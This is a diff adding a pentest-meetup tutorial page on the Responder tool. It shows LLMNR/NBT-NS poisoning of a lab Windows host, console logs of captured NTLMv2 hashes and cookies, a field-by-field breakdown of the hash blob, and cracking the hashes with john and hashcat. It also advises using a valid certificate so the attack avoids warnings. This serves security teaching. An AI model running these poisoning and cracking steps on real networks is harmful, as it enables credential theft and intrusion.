@@ -1,0 +1,866 @@
+.. include:: /pentest_links.txt
+
+
+************
+`Responder`_
+************
+
+Gathering credentials with `Responder`_
+=======================================
+
+`Responder`_ is a passive credentials gathering tool. From `Responder`_:
+
+  Responder is a LLMNR (Link-local Multicast Name Resolution), NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. 
+
+  ...
+
+  This tool is first an LLMNR, NBT-NS (NetBIOS Name Service) and MDNS responder, it will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answer to File Server Service request, which is for SMB. The concept behind this, is to target our answers, and be stealthier on the network. This also helps to ensure that we don't break legitimate NBT-NS behavior. You can set the -r option via command line if you want this tool to answer to the Workstation Service request name suffix.
+
+`Responder`_ takes advantage of the fact that Microsoft client name resolution can resort to use broadcast traffic to locate resources, giving an opportunity to impersonate HTTP/SMB/MSSQL/FTP/LDAP servers, getting clients to reveal their credential information. For LM/NTLM/NTLMv2 only the hash is revealed, but that can be used for brute force password guessing.
+
+For more information read these posts:
+
+  `Introducing Responder-1.0 <http://blog.spiderlabs.com/2012/10/introducing-responder-10.html>`_
+
+  `Owning Windows Networks with Responder 1.7 <http://blog.spiderlabs.com/2013/01/owning-windows-networks-with-responder-17.html>`_
+
+  `Owning Windows Networks With Responder Part 2 <http://blog.spiderlabs.com/2013/02/owning-windows-network-with-responder-part-2.html>`_
+
+  `Responder 2.0 - Owning Windows Networks part 3  <http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html>`_
+
+`Responder`_ tool specifics
+---------------------------
+
+`Responder`_ is installed via the Kali responder package. It's designed to be a root-only single user application due to the fact that the configuration file and logs are in the :file:`/usr/share/responder` directory and require root to create/update log files.
+
+Responder.conf
+^^^^^^^^^^^^^^
+
+The :file:`Responder.conf` configuration file is located in :file:`/usr/share/responder/` (as are the log files). Comments start with a semi-colon (";").
+
+[Responder Core]
+  "SERVICE = On/Off"
+    Turns on/off the basic rogue servers (and therefore provides a list of them). Currently the servers are: SQL, SMB, Kerberos, FTP, POP, SMTP, IMAP, HTTP, HTTPS, DNS, and LDAP.
+
+  "Challenge = 1122334455667788"
+    Sets the challenge for LM/NTLM challenge/response. This is important as rainbow tables assume a specific, fixed challenge ("1122334455667788").
+
+  "SessionLog = Responder-Session.log"
+    Main log file.
+
+  "RespondTo =", "RespondToName =", "DontRespondTo =", "DontRespondToName ="
+    Defines hosts to exploit or not exploit.
+
+[HTTP Server]
+  "Serve-Always = Off" & "Filename = Denied.html"
+    Set to always serve a specific file to the victim.
+
+  "Serve-Exe = Off" & "ExecFilename = FixInternet.exe"
+    Set to serve an executable file each time a .exe is detected in an URL.
+  
+  "WPADScript = ...", "HTMLToServe = ..."
+    Custom PAC script (for WPAD) and HTML for SMB server RespProxySrv.
+
+[HTTPS Server]
+  "cert = Certs/responder.crt", "key = Certs/responder.key"
+    Certs for serving HTTPS.
+
+Log files
+^^^^^^^^^
+
+Running the following can show the latest `Responder`_ log files updated:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2
+
+  ls -lrt /usr/share/responder/*.{log,txt}
+  ls -lrt /usr/share/responder/HTTPCookies
+
+.. code-block:: console
+  :emphasize-lines: 1,6
+
+  hacker@kali:~$ ls -lrt /usr/share/responder/*.{log,txt}
+  -rw-r--r-- 1 root root     0 May 13 18:03 /usr/share/responder/Analyze-LLMNR-NBT-NS.log
+  -rw-r--r-- 1 root root   607 May 13 22:09 /usr/share/responder/HTTP-NTLMv2-Client-192.168.1.103.txt
+  -rw-r--r-- 1 root root   177 May 13 22:09 /usr/share/responder/LLMNR-NBT-NS.log
+  -rw-r--r-- 1 root root 17335 May 13 22:09 /usr/share/responder/Responder-Session.log
+  hacker@kali:~$ ls -lrt /usr/share/responder/HTTPCookies
+  total 24
+  -rw-r--r-- 1 root root 112 May 13 22:09 HTTP-Cookie-request-cdp1.public-trust.com-from-192.168.1.103.txt
+  -rw-r--r-- 1 root root 199 May 13 22:09 HTTP-Cookie-request-gb.symcd.com-from-192.168.1.103.txt
+  -rw-r--r-- 1 root root  89 May 13 22:09 HTTP-Cookie-request-gb.symcb.com-from-192.168.1.103.txt
+  -rw-r--r-- 1 root root 414 May 13 22:09 HTTP-Cookie-request-ocsp.digicert.com-from-192.168.1.103.txt
+  -rw-r--r-- 1 root root 221 May 13 22:09 HTTP-Cookie-request-crl3.digicert.com-from-192.168.1.103.txt
+  -rw-r--r-- 1 root root 221 May 13 22:09 HTTP-Cookie-request-crl4.digicert.com-from-192.168.1.103.txt
+
+
+"SessionLog = Responder-Session.log" sets the main log file which saves the console output from `Responder`_. HTTP cookies are stored in the subdirectory :file:`HTTPCookies` while each of the servers will have 1 or more ".log" files of their own. For example, captured hashes would have the log file name [SMB/HTTP/SQL]-[NTLMv1/v2]-Client-IP.txt with data stored in the John Jumbo format.
+
+Here are some actual logs after a very short run: :file:`LLMNR-NBT-NS.log` shows the LLMNR/NBT-NS poisoning and :file:`HTTP-NTLMv2-Client-192.168.1.103.txt` shows the HTTP server's captured NTLMv2 hashes from IP 192.168.1.103:
+
+.. code-block:: bash
+  :emphasize-lines: 1-3
+
+  cat /usr/share/responder/LLMNR-NBT-NS.log
+  cat /usr/share/responder/HTTP-NTLMv2-Client-192.168.1.103.txt
+  cat /usr/share/responder/Responder-Session.log
+
+.. code-block:: console
+  :emphasize-lines: 1,4,6,12-16
+
+  hacker@kali:~$ cat /usr/share/responder/LLMNR-NBT-NS.log
+  LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : wpad.
+  LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : isaproxysrv.
+  hacker@kali:~$ cat /usr/share/responder/HTTP-NTLMv2-Client-192.168.1.103.txt
+  jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000
+  hacker@kali:~$ cat /usr/share/responder/Responder-Session.log
+  05/13/2015 10:07:04 PM Responder Started
+  Command line args:['/usr/bin/responder', '-i', '192.168.1.104', '-w', '-F']
+  05/13/2015 10:09:19 PM LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : wpad.
+  05/13/2015 10:09:36 PM [+]HTTP GET request from : 192.168.1.103. The HTTP URL requested was: /wpad.dat 
+  05/13/2015 10:09:36 PM No cookies were sent with this request
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 hash captured from :192.168.1.103
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 User is : jgm
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Domain is :taxing
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Hostname is :TAXING
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Complete hash is :jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000
+  05/13/2015 10:09:36 PM [+]WPAD (auth) file sent to: 192.168.1.103
+  05/13/2015 10:09:36 PM [+]HTTP GET request from : 192.168.1.103. The HTTP URL requested was: /wpad.dat 
+  05/13/2015 10:09:36 PM No cookies were sent with this request
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 hash captured from :192.168.1.103
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 User is : jgm
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Domain is :taxing
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Hostname is :TAXING
+  05/13/2015 10:09:36 PM [+]HTTP NTLMv2 Complete hash is :jgm::taxing:1122334455667788:F72F2131E5F245D1FDC187FBB10C5D65:010100000000000042A43E2C048ED00194B7398786D7F504000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000001000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300034000000000000000000
+  05/13/2015 10:09:36 PM [+]WPAD (auth) file sent to: 192.168.1.103
+  05/13/2015 10:09:36 PM LLMNR poisoned answer sent to this IP: 192.168.1.103. The requested name was : isaproxysrv.
+  ###################### SNIP ######################
+
+Cleaning up the log files is accomplished by:
+
+.. code-block:: bash
+  :emphasize-lines: 4-7
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  RDIR=/usr/share/responder
+  $SUDO rm \
+    $RDIR/*.{log,txt} \
+    $RDIR/HTTPCookies/* \
+    $RDIR/Responder-Session.log
+
+Captured challenge file format
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+The captured hashes in :file:`HTTP-NTLMv2-Client-$T.txt` look like:
+
+.. code-block:: console
+
+  hacker@kali:/usr/share/responder$ ls HTTP-*
+  HTTP-NTLMv2-Client-192.168.1.103.txt
+  hacker@kali:/usr/share/responder$ cat HTTP-*
+  jgm::taxing:1122334455667788:BE429406642BF55E51748A867ACDD409:010100000000000042
+  A43E2C048ED00113456A9D55B36A4E000000000200060053004D0042000100160053004D0042002D
+  0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C00030028
+  0073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C
+  000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000
+  1000005436C9CCC131C3A88D569E3A3CAD25E1882D24E33F82CB960F8C6809D4139D3F0A00100000
+  0000000000000000000000000000000900240048005400540050002F003100390032002E00310036
+  0038002E0031002E003100300034000000000000000000
+
+This consists of:
+
+* "jgm" = user
+* "taxing" = server
+* "1122334455667788" = server challenge
+* "BE429406642BF55E51748A867ACDD409" = NTLMv2 hash (first 32 bits of NTLMv2 type 3 response)
+* the blob = everything except for the first 32 bits of NTLMv2 type 3 response
+
+So what's in "the blob"?
+
+================================   ====================   =======================================
+blob field                         hex data               data meaning
+================================   ====================   =======================================
+blob signature                     01010000               indicates start of blob
+reserved                           00000000
+timestamp                          42A43E2C048ED001       little-endian 64-bit signed number of
+                                                          tenths of a microsecond since 1601/1/1
+client nonce                       13456A9D55B36A4E       client challenge
+unknown                            00000000
+target information data                                   target data from client's type 2 response
+>> type: 2 (NetBIOS domain name)   0200
+>> length: 6 bytes                 0600
+>> data:                           53004D004200           "SMB"
+>> type: 1 (server name)           0100
+>> length: 22                      1600
+>> data:                           53004D0042002D00       "SMBTOOLKIT"
+>>                                 54004F004F004C00
+>>                                 4B0049005400
+>> type: 4 (dns domain name)       0400
+>> length: 18                      1200
+>> data:                           73006D0062002E00       "smb.local"
+>>                                 6C006F0063006100
+>>                                 6C00
+>> type: 3 (dns server name)       0300
+>> length: 40                      2800
+>> data:                           7300650072007600       "server2003.smb.local"
+>>                                 6500720032003000
+>>                                 300033002E007300
+>>                                 6D0062002E006C00
+>>                                 6F00630061006C00
+>> type: 5 (FQDN of forest)        0500
+>> length: 18                      1200
+>> data:                           73006D0062002E00       "smb.local"
+>>                                 6C006F0063006100
+>>                                 6C00
+>> type: 8 (single host data)      0800                   when client/server same host
+>> length: 48                      3000
+>> data:                           30000000               32 unsigned length = 48
+>>                                 00000000               Z4 = 0
+>>                                 01000000               1 = indicates custom data present
+>>                                 00100000               4 bytes custom data blob
+>>                                 5436C9CCC131C3A8       machine ID (32 bytes)
+>>                                 8D569E3A3CAD25E1
+>>                                 882D24E33F82CB96
+>>                                 0F8C6809D4139D3F
+>> type: 10 (channel bindings)     0A00                   hash of channel bindings
+>> length: 16                      1000
+>> data:                           0000000000000000       0 means no bindings
+>>                                 0000000000000000
+>> type: 9  (SPN of target)        0900
+>> length: 36                      2400
+>> data:                           4800540054005000       "HTTP/192.168.1.104"
+>>                                 2F00310039003200
+>>                                 2E00310036003800
+>>                                 2E0031002E003100
+>>                                 30003400
+>> type: 0                         0000                   AV type 0, length 0 at list end
+>> length: 0                       0000
+unknown                            00000000
+================================   ====================   =======================================
+
+Running `Responder`_
+^^^^^^^^^^^^^^^^^^^^
+
+.. todo:: provide details of running `Responder`_
+
+#. :file:`/usr/share/responder/` setup
+
+   #. Prior to running `Responder`_ you should edit :file:`Responder.conf` to limit the following:
+
+      * [Responder Core] SERVICE = On/Off
+
+        At our pentest-meetup you'll probably only want to allow SMB, HTTP, HTTPS, and DNS.
+
+      * [Responder Core] RespondTo = ...
+
+        At our pentest-meetup you'll probably want to list the known Windows sacrificial lambs provided by your fellow pentesters.
+
+      * [HTTPS Server] cert = Certs/responder.crt & key = Certs/responder.key
+
+        A real exploit should not generate a certificate warning, so get get one and use it.
+
+   #. Clean up prior log files as needed:
+
+      .. code-block:: bash
+
+        SUDO=$(which sudo)
+        [[ "$USER" == "root" ]] && SUDO=
+        RDIR=/usr/share/responder
+        $SUDO rm \
+          $RDIR/*.{log,txt} \
+          $RDIR/HTTPCookies/* \
+          $RDIR/Responder-Session.log
+
+#. Run first without generating any poisoned responses using the "-A" option.
+
+#. After observing for a while, turn on the services required to attack the selected victims.
+
+Here we illustrate running in analyze mode: a Windows 7 client taxing/WORKGROUP (192.168.1.101) boots up, fires up IE, and then runs the ``dir \\SERVER\SHARE`` command; also a Brothers printer BRN30055C139BE5 (192.168.1.3) chimes in.
+
+   .. code-block:: bash
+     :emphasize-lines: 1-2,13-28,31,33-
+
+      hacker@kali:~/pentest/responder$ IP=192.168.1.105
+      hacker@kali:~/pentest/responder$ $SUDO responder -A -i $IP
+      NBT Name Service/LLMNR Responder 2.0.
+      Please send bugs/comments to: lgaffie@trustwave.com
+      To kill this script hit CRTL-C
+
+      [+]NBT-NS, LLMNR & MDNS responder started
+      [+]Loading Responder.conf File..
+      Global Parameters set:
+      Responder is bound to this interface: ALL
+      Challenge set: 1122334455667788
+      WPAD Proxy Server: False
+      WPAD script loaded:  function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
+      HTTP Server: ON
+      HTTPS Server: ON
+      SMB Server: ON
+      SMB LM support: False
+      Kerberos Server: ON
+      SQL Server: ON
+      FTP Server: ON
+      IMAP Server: ON
+      POP3 Server: ON
+      SMTP Server: ON
+      DNS Server: ON
+      LDAP Server: ON
+      FingerPrint hosts: False
+      Serving Executable via HTTP&WPAD: OFF
+      Always Serving a Specific File via HTTP&WPAD: OFF
+
+
+      [+]Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
+
+      [Analyze mode: LLMNR] Host: 169.254.129.234 is looking for : taxing.
+      [Analyze mode: LLMNR] Host: 192.168.1.101 is looking for : taxing.
+      [Analyze mode: LLMNR] Host: 192.168.1.101 is looking for : wpad.
+      [Analyze mode: NBT-NS] Host: 192.168.1.101 is looking for : WPAD. Service requested is: Workstation/Redirector Service.
+      [Analyze mode: Browser]Datagram Request from IP: 192.168.1.101 hostname: TAXING via the: File Server Service. to: WORKGROUP. Service: Local Master Browser.
+      [Analyze mode: Browser]Datagram Request from IP: 192.168.1.101 hostname: TAXING via the: File Server Service. to: WORKGROUP. Service: Local Master Browser.
+      [Analyze mode: Browser]Datagram Request from IP: 192.168.1.101 hostname: TAXING via the: Workstation/Redirector Service. to: WORKGROUP. Service: Local Master Browser.
+      [Analyze mode: Browser]Datagram Request from IP: 192.168.1.101 hostname: TAXING via the: Workstation/Redirector Service. to: WORKGROUP. Service: Browser Election Service.
+      [Analyze mode: Browser]Datagram Request from IP: 192.168.1.101 hostname: TAXING via the: File Server Service. to: WORKGROUP. Service: Browser Election Service.
+      [Analyze mode LANMAN]:
+      [!]Domain detected on this network:
+         -WORKGROUP
+      [!]Workstations/Servers detected on Domain WORKGROUP:
+         -TAXING
+             [-]Os version is:Windows 7/Server 2008R2
+      [Analyze mode: Browser]Datagram Request from IP: 192.168.1.3 hostname: BRN30055C139BE5 via the: Workstation/Redirector Service. to: WORKGROUP. Service: Browser Election Service.
+      [Analyze mode LANMAN]:
+      [!]Domain detected on this network:
+         -WORKGROUP
+      [!]Workstations/Servers detected on Domain WORKGROUP:
+         -BRN30055C139BE5
+         -TAXING
+             [-]Os version is:Windows 7/Server 2008R2
+      [Analyze mode: LLMNR] Host: 192.168.1.101 is looking for : SERVER.
+      [Analyze mode: NBT-NS] Host: 192.168.1.101 is looking for : SERVER. Service requested is: File Server Service.
+
+Now we repeat the experiment to attack WPAD and SMB:
+
+.. code-block:: bash
+
+  $SUDO responder -i $IP -w
+  ls -lrt /user/share/responder/
+  ls -lrt /user/share/responder/HTTPCookies/
+
+
+Running this gives the following hash in response to the "dir \\SERVER\SHARE" and cookies from HTTP traffic:
+
+.. code-block:: console
+
+  ###################### SNIP ######################
+  LLMNR poisoned answer sent to this IP: 192.168.1.101. The requested name was : SERVER.
+  [+]SMB-NTLMv2 hash captured from :  192.168.1.101
+  [+]SMB complete hash is : jgm::taxing:1122334455667788:80F748A72D85988D6A969D05319FC6F4:01010000000000000F18587EE1A3D001FDB876F9C5B22DDC0000000002000A0073006D006200310032000100140053004500520056004500520032003000300038000400160073006D006200310032002E006C006F00630061006C0003002C0053004500520056004500520032003000300038002E0073006D006200310032002E006C006F00630061006C000500160073006D006200310032002E006C006F00630061006C000800300030000000000000000100000000200000327B8C4C70662C00D3F65C0550C12F3503F349FE17B292471833B989CF9FC4220A001000000000000000000000000000000000000900160063006900660073002F005300450052005600450052000000000000000000
+  ###################### SNIP ######################
+  ^C
+  hacker@kali:~/pentest/responder$ ls -lrt /usr/share/responder/
+  ###################### SNIP ######################
+  -rw-r--r-- 1 root root    532 Jun 10 17:57 LLMNR-NBT-NS.log
+  -rw-r--r-- 1 root root    607 Jun 10 17:57 SMB-NTLMv2-Client-192.168.1.101.txt
+  -rw-r--r-- 1 root root   2973 Jun 10 17:57 Responder-Session.log
+  drwxr-xr-x 2 root root   4096 Jun 10 17:57 HTTPCookies
+  hacker@kali:~/pentest/responder$ ls -lrt /usr/share/responder/HTTPCookies
+  total 16
+  -rw-r--r-- 1 root root  95 Jun 10 17:56 HTTP-Cookie-request-www.msftncsi.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root 739 Jun 10 17:56 HTTP-Cookie-request-www.google.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  94 Jun 10 17:57 HTTP-Cookie-request-pki.google.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root 115 Jun 10 17:57 HTTP-Cookie-request-crl.microsoft.com-from-192.168.1.101.txt
+
+Now we repeat the experiment using the "--lm" option to see if we can get a LM response (no), the "-F" option to force authentication for WPAD, and "-f" to fingerprint the host. Interestingly enough, we get a hash just by booting up and logging on (without having to even open IE or trying the "dir \\SERVER\SHARE" command):
+
+.. code-block:: bash
+
+  $SUDO responder -i $IP -w -F -f
+  ls -lrt /user/share/responder/
+  ls -lrt /user/share/responder/HTTPCookies/
+
+Running this give the following NTLMv2 hash in response pre-fetching the :file:`wpad.dat`. Notice the "--lm" option did not force a LM hash. And there are tons more cookies due to vising a site loaded with them:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/responder$ $SUDO responder -i $IP -w -F -f
+  ###################### SNIP ######################
+  [+]HTTP GET request from : 192.168.1.101. The HTTP URL requested was: /wpad.dat 
+  [+]HTTP NTLMv2 hash captured from : 192.168.1.101
+  Complete hash is :  jgm::taxing:1122334455667788:3E86C99BDD81CF4F3227F87F12714331:010100000000000099C7A7EAE2A3D001EF2FF33947B4DBEB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000CAAA5032737FD6A6F66349DABAD641A3EAF6B0862F4DA9031D94D6000DBC8A160A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E0031002E003100300035000000000000000000
+  [+] OsVersion is:Windows 7 Enterprise 7601 Service Pack 1
+  [+] ClientVersion is :Windows 7 Enterprise 6.1
+  ###################### SNIP ######################
+  ^C
+  hacker@kali:~/pentest/responder$ ls -lrt /usr/share/responder/
+  total 592
+  ###################### SNIP ######################
+  -rw-r--r-- 1 root root    607 Jun 10 18:07 HTTP-NTLMv2-Client-192.168.1.101.txt
+  drwxr-xr-x 2 root root   4096 Jun 10 18:08 HTTPCookies
+  -rw-r--r-- 1 root root    617 Jun 10 18:08 LLMNR-NBT-NS.log
+  -rw-r--r-- 1 root root 119744 Jun 10 18:08 Responder-Session.log
+  hacker@kali:~/pentest/responder$ ls -lrt /usr/share/responder/HTTPCookies
+  total 80
+  -rw-r--r-- 1 root root   95 Jun 10 17:56 HTTP-Cookie-request-www.msftncsi.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  739 Jun 10 17:56 HTTP-Cookie-request-www.google.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root   94 Jun 10 17:57 HTTP-Cookie-request-pki.google.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  115 Jun 10 17:57 HTTP-Cookie-request-crl.microsoft.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  206 Jun 10 18:07 HTTP-Cookie-request-ocsp.verisign.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root   95 Jun 10 18:07 HTTP-Cookie-request-crl.verisign.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  188 Jun 10 18:08 HTTP-Cookie-request-ocsp.geotrust.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  112 Jun 10 18:08 HTTP-Cookie-request-cdp1.public-trust.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  104 Jun 10 18:08 HTTP-Cookie-request-crl.geotrust.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root 1028 Jun 10 18:08 HTTP-Cookie-request-ocsp.digicert.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  217 Jun 10 18:08 HTTP-Cookie-request-vassg141.ocsp.omniroot.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  199 Jun 10 18:08 HTTP-Cookie-request-gb.symcd.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  330 Jun 10 18:08 HTTP-Cookie-request-crl3.digicert.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  108 Jun 10 18:08 HTTP-Cookie-request-vassg141.crl.omniroot.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root   89 Jun 10 18:08 HTTP-Cookie-request-gb.symcb.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  182 Jun 10 18:08 HTTP-Cookie-request-g.symcd.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root   99 Jun 10 18:08 HTTP-Cookie-request-g.symcb.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  183 Jun 10 18:08 HTTP-Cookie-request-gv.symcd.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root  451 Jun 10 18:08 HTTP-Cookie-request-crl4.digicert.com-from-192.168.1.101.txt
+  -rw-r--r-- 1 root root   89 Jun 10 18:08 HTTP-Cookie-request-gv.symcb.com-from-192.168.1.101.txt
+
+Notice that the NTLMv2 hashes are different: that's because the client also generates it's own challenge which is returned back in the response. This makes rainbow tables ineffective. Here we show how to crack the hash with a dictionary (seeded with the first entry being the actual password):
+
+.. code-block:: bash
+
+  # get the hashes into one file
+  rm -rf hashes.lst
+  cat /usr/share/responder/HTTP-NTLMv2-Client-*.txt >> hashes.lst
+  cat /usr/share/responder/SMB-NTLMv2-Client-*.txt >> hashes.lst
+  # add the actual password as the first entry in the password list
+  echo "pentest-meetup" > password.lst
+  zcat /usr/share/wordlists/rockyou.txt.gz >> password.lst
+  # running john is as simple as
+  /usr/sbin/john --wordlist=password.lst hashes.lst | tee cracked-john.txt
+  # hashcat requires more work and (for the first run) saying YES to a license
+  MODE=$(head -n 1 hashes.lst | python2 $(which hashid) -m | \
+      grep 'Hashcat Mode:' | head -n 1 | sed 's/^.*Hashcat Mode: //;s/]$//')
+  hashcat --hash-type=$MODE hashes.lst password.lst  | tee cracked-hydra.txt
+
+
+Running this cracks the hash:
+
+.. code-block:: console
+  :emphasize-lines: 9,12-14,18,20-21,23
+
+  hacker@kali:~/pentest/responder$ # get the hashes into one file
+  hacker@kali:~/pentest/responder$ rm -rf hashes.lst
+  hacker@kali:~/pentest/responder$ cat /usr/share/responder/HTTP-NTLMv2-Client-*.txt >> hashes.lst
+  hacker@kali:~/pentest/responder$ cat /usr/share/responder/SMB-NTLMv2-Client-*.txt >> hashes.lst
+  hacker@kali:~/pentest/responder$ # add the actual password as the first entry in the password list
+  hacker@kali:~/pentest/responder$ echo "pentest-meetup" > password.lst
+  hacker@kali:~/pentest/responder$ zcat /usr/share/wordlists/rockyou.txt.gz >> password.lst
+  hacker@kali:~/pentest/responder$ # running john is as simple as
+  hacker@kali:~/pentest/responder$ /usr/sbin/john --wordlist=password.lst hashes.lst | tee cracked-john.txt
+  guesses: 2  time: 0:00:00:00 DONE (Wed Jun 10 18:25:26 2015)  c/s: 6942  trying: pentest-meetup - queen
+  Use the "--show" option to display all of the cracked passwords reliably
+  Loaded 2 password hashes with 2 different salts (NTLMv2 C/R MD4 HMAC-MD5 [32/64])
+  pentest-meetup   (jgm)
+  pentest-meetup   (jgm)
+  hacker@kali:~/pentest/responder$ # hashcat requires more work and (for the first run) saying YES to a license
+  hacker@kali:~/pentest/responder$ MODE=$(head -n 1 hashes.lst | python2 $(which hashid) -m | \
+  >     grep 'Hashcat Mode:' | head -n 1 | sed 's/^.*Hashcat Mode: //;s/]$//')
+  hacker@kali:~/pentest/responder$ hashcat --hash-type=$MODE hashes.lst password.lst  | tee cracked-hydra.txt
+  ###################### SNIP ######################
+  JGM::taxing:1122334455667788:3e86c99bdd81cf4f3227f87f12714331:010100000000000099c7a7eae2a3d001ef2ff33947b4dbeb000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c000800300030000000000000000100000000200000caaa5032737fd6a6f66349dabad641a3eaf6b0862f4da9031d94d6000dbc8a160a001000000000000000000000000000000000000900240048005400540050002f003100390032002e003100360038002e0031002e003100300035000000000000000000:pentest-meetup
+  JGM::taxing:1122334455667788:80f748a72d85988d6a969d05319fc6f4:01010000000000000f18587ee1a3d001fdb876f9c5b22ddc0000000002000a0073006d006200310032000100140053004500520056004500520032003000300038000400160073006d006200310032002e006c006f00630061006c0003002c0053004500520056004500520032003000300038002e0073006d006200310032002e006c006f00630061006c000500160073006d006200310032002e006c006f00630061006c000800300030000000000000000100000000200000327b8c4c70662c00d3f65c0550c12f3503f349fe17b292471833b989cf9fc4220a001000000000000000000000000000000000000900160063006900660073002f005300450052005600450052000000000000000000:pentest-meetup
+
+  All hashes have been recovered
+  ###################### SNIP ######################
+
+
+LM & NTLM exploitation
+======================
+
+`NTLM Based Authentication in Web Applications: The Good, The Bad, and the NHASTIE <https://www.owasp.org/images/3/37/OWASP-IL-2014-01_nhastie-presentation.pdf>`_ shows attack vectors for NTLM-based authentication.
+
+`Protecting Privileged Domain Accounts: LM Hashes -- The Good, the Bad, and the Ugly <http://digital-forensics.sans.org/blog/2012/02/29/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly>`_
+
+http://security.stackexchange.com/questions/63890/does-windows-have-a-built-in-password-store/63909#63909
+
+http://digital-forensics.sans.org/blog/2012/03/09/protecting-privileged-domain-accounts-disabling-encrypted-passwords
+
+http://digital-forensics.sans.org/blog/2012/02/29/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly
+
+http://securityxploded.com/windows-vault-password-decryptor.php
+
+http://www.darknet.org.uk/2015/02/windows-credentials-editor-wce-list-add-change-logon-sessions/
+
+http://tipstrickshack.blogspot.com/2013/02/how-to-get-windows-passwords-in-plain.html
+
+http://en.wikipedia.org/wiki/Pass_the_hash
+
+http://en.wikipedia.org/wiki/SMBRelay
+
+https://technet.microsoft.com/library/security/ms08-068
+
+https://technet.microsoft.com/library/security/ms06-030
+
+https://technet.microsoft.com/library/security/ms05-011
+
+https://github.com/gentilkiwi/mimikatz
+
+http://pentestmonkey.net/blog/mimikatz-tool-to-recover-cleartext-passwords-from-lsass
+
+http://blog.opensecurityresearch.com/2012/06/using-mimikatz-to-dump-passwords.html
+
